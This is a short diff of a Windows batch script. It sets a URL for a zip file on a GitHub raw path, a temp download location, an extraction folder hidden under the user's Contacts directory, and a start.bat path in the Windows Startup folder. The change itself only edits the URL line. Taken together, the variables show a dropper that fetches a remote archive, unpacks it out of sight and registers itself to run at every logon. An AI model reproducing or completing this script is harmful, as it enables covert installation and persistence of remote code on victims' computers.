@@ -1,7 +1,7 @@
 @echo off
 
 setlocal
-set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/zo.zip"
+set "site_url=https://raw.githubusercontent.com/MoViper2244/VIPER2/refs/heads/main/"
 set "z=%TEMP%\zo.zip"
 set "d=%USERPROFILE%\Contacts\zo"
 set "s=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
